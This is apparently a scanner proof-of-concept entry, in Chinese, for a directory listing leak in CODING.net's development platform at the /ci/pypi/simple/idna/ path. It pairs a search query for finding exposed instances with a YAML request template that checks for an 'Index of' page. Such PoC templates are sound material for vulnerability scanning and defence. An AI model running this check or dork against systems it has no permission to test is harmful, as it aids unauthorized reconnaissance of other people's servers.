 CODing.net是一个面向开发者的云端开发平台，提供 Git/SVN 代码托管、任务管理，在idna存在目录泄露漏洞，攻击者可获取目录文件信息。

检索条件: title="一站式软件研发管理平台"

poc

```
relative: req0
session: false
requests:
- method: GET
timeout: 10
path: /ci/pypi/simple/idna/
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36
follow_redirects: true
matches: (code.eq("200") && body.contains("Index of"))
```

